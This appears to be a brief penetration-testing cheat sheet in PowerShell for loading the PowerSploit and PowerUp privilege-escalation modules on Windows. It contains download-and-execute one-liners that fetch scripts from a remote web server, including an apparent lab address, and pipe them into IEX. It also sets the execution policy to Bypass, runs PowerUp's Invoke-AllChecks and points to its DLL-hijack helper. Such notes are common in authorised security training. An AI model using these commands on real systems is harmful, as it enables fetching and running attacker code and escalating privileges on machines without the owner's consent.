```powershell
# show where to put powersploit/powerup
echo $Env:PSModulePath

# downloading scripts from web-servers
IEX (New-Object Net.WebClient).DownloadString("http://<ip_address>/full_path/script_name.ps1")
IEX (New-Object Net.WebClient).DownloadString("http://10.11.0.68/PowerSploit/Privesc/PowerUp.ps1")

# show if we are allowed to execute
Get-ExecutionPolicy -List

# set to allow for ourselfes
Set-ExecutionPolicy Bypass -Scope CurrentUser

# invoke 
Import-Module PowerSploit
Import-Module Privesc

# show available commands
Get-Command -Module PowerSploit
Get-Command -Module Privesc

# powerup
Invoke-AllChecks

# RTFM
Get-Help <cmd>
Get-Help Write-HijackDLL
```

